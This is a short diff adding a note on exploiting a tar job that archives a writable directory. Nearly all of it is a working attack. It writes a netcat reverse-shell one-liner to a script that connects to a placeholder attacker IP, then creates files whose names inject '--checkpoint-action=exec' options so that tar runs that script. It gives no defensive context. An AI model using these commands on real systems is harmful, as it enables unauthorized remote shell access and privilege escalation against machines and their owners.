@@ -1,0 +1,5 @@
+This is a reverse shell for if tar is running as a job and the directories being tar'd are able to be written to.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
+touch "<dir being tar'd>/--checkpoint-action=exec=sh shell.sh"
+touch "<dir being tar'd>/--checkpoint=1"
